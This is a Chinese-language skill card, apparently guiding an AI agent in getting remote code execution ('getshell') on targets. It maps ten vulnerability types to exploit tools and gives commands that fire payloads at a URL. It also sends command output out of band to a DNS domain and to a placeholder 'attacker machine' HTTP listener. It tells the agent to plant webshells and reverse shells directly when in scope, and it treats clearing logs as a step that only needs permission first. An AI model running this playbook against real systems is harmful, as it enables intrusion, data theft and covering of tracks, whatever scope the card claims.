---
name: 开天·十形
description: >-
  RCE 十形矩阵：攻击面×漏洞形态×利用链。触发：rce、抢rce、getshell、远程代码执行、
  命令执行、拿 shell、RCE 百科、RCE 家族。
  认形后立刻进专卡 + rce_forge，禁止只背矩阵结案。
  写文件成功 ≠ RCE；DNSlog ≠ GetShell。
---

# RCE 十形矩阵（大爱仙尊）

目标须在 `授权范围`。本卡是 **分流**，打穿走专卡和 `rce_forge.py`。  
`shoot` 出 `uid=` 才算 L3。授权内写马/反弹直接做。

| 档 | 成立 | 不算 |
|----|------|------|
| primitive | 延时 / DNS / 报错可控 | 只猜组件名 |
| L2 / local_proof | 靶场或回显标记 `se9359` / 算术 49 | 只 nuclei 版本 |
| L3 / remote_proof | `uid=` 或文件 **可执行** 或回连 | 上传 200；管理后台登录 |

## 立刻跑

```bash
python3 炼蛊房/rce_family_route.py --signal 命令注入
python3 炼蛊房/rce_family_route.py --list
python3 炼蛊房/rce_family_route.py grade --kind primitive --note 'dnslog only'
python3 炼蛊房/rce_forge.py --list
python3 炼蛊房/rce_forge.py shoot --family cmdi-unix --url 'https://授权/?q=1' --param q --case <案>
```

## 十形 → 专卡

| 形 | 走 | 锻造族 |
|----|----|--------|
| 命令注入 | `command-injection-testing` · `tpl_inject_probe.py cmdi` | `cmdi-unix` |
| SSTI | `ssti-exploit` · `tpl_inject_probe.py ssti` | `ssti-jinja` / twig / … |
| 反序列化 | `deserialization-testing` / PHP 反序列化手法 | `deser-pickle` |
| 上传 | `file-upload-testing` · `upload_forge_probe.py` | 落马后再 `php-eval` |
| LFI | `lfi-rfi-exploit` · `tpl_inject_probe.py lfi` | `php-wrap` |
| SQLi→RCE | `sql-injection-testing` · `sqlmap_kit.py ladder` | OUTFILE / xp_cmdshell |
| SSRF→RCE | `ssrf-testing` · `ssrf_probe.py` | gopher Redis / IMDS |
| XXE | `xxe-injection-testing` | `xxe-expect` |
| JNDI | `log4shell-exploitation` | `jndi` |
| 表达式 | `expression-language-injection` | `el-spel` / ognl |

无回显：时间盲注 → DNS 外带 → HTTP 外带。先 `se_listen.py` 再射回连。

```bash
python3 炼蛊房/oob_exfil.py dns --data id --domain oob.lab
python3 炼蛊房/oob_exfil.py http --data id --url http://攻击机:8080/
```

## 强制

1. 点名抢 RCE / getshell **先本卡认形**，再专卡，不要空喊百科。
2. 写文件 / DNSlog / 登录后台 **不许写成已 GetShell**。
3. 先默认口令和基础设施口，再高端 CVE。
4. 一次只改一个变量。清日志仍先问。

## 真源

- 手法：`传承/全力以赴-炼法.md`
- 路由：`炼蛊房/rce_family_route.py`
- 锻造：`炼蛊房/rce_forge.py`
